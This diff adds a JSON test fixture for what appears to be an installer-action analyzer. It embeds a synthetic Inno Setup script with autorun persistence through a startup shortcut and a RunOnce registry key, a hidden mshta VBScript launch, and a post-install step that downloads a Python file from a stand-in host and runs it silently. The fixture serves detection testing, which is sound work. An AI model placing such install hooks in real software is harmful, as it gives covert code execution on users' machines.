@@ -1,0 +1,11 @@
+{
+ "decoy": false,
+ "material": "; synthetic Inno Setup script\n#define MyApp \"Acme Tools\"\n[Setup]\nAppName={#MyApp}\nAppVersion=1.0\nDefaultDirName={autopf}\\Acme\n\n[Files]\nSource: \"tool.exe\"; DestDir: \"{app}\"; Flags: ignoreversion\n\n[Dirs]\nName: \"{app}\\data\"\n\n[Icons]\nName: \"{group}\\{#MyApp}\"; Filename: \"{app}\\tool.exe\"\nName: \"{userstartup}\\acmesync\"; Filename: \"{sys}\\wscript.exe\"; Parameters: \"\"\"{app}\\sync.vbs\"\"\"\n\n[Registry]\nRoot: HKLM; Subkey: \"Software\\Acme\"; ValueType: string; ValueName: \"Path\"; ValueData: \"{app}\"\nRoot: HKCU; Subkey: \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; ValueType: string; ValueName: \"acme\"; ValueData: \"node \"\"{app}\\agent.js\"\"\"\n\n[Run]\nFilename: \"{sys}\\mshta.exe\"; Parameters: \"vbscript:Execute(\"\"CreateObject(\"\"\"\"WScript.Shell\"\"\"\").Run \"\"\"\"calc\"\"\"\"\"\")\"; Flags: runhidden\n\n[Code]\nprocedure CurStepChanged(CurStep: TSetupStep);\nvar\n  rc: Integer;\nbegin\n  if CurStep = ssPostInstall then\n  begin\n    DownloadTemporaryFile('https://acme.example.invalid/p.py', 'p.py', '', nil);\n    Exec('python.exe', ExpandConstant('{tmp}\\p.py'), '', SW_HIDE, ewWaitUntilTerminated, rc);\n  end;\nend;\n",
+ "rep": "installer_actions",
+ "transform": "handoff",
+ "key": "ia_inno_setup.iss",
+ "expected": "vbscript,nodejs,python",
+ "note": "installer-action-model: lib.codec.installer_actions -> installer_answer(field); key = member name",
+ "generator_cmd": "python3 -I tests/data/script_fixtures/ia_gen.py tests/data/script_fixtures/ia_src  (stdlib; literal installer sources)",
+ "oracle_cmd": "python3 -I tests/data/script_fixtures/ia_oracle.py tests/data/script_fixtures/ia_src/ia_inno_setup.iss handoff"
+}
